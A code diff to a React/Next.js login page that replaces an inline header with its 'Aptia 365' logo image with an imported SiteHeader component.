@@ -4,6 +4,7 @@ import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
+import { SiteHeader } from "@/components/site-header";
 
 export default function LoginPage() {
   // --- All original hooks and logic preserved ---
@@ -194,14 +195,7 @@ export default function LoginPage() {
             .footer-sitemap a:hover{text-decoration:underline;}
             @media(max-width:500px){main{padding:32px 12px 28px;}.btn{width:100%;justify-content:center;}.footer-links{gap:7px 14px;}}
           `}</style>
-          <header>
-            <img
-              className="logo-img"
-              src="/Aptia-365-RGB-Light-bg_resize+for+WCP.89a04093fc33467fac75385534b60d84.png"
-              alt="Aptia 365"
-            />
-            <span className="header-title">Login</span>
-          </header>
+          <SiteHeader />
           {/* Wrap main and footer in a fragment to ensure valid JSX */}
           <>
             <main>
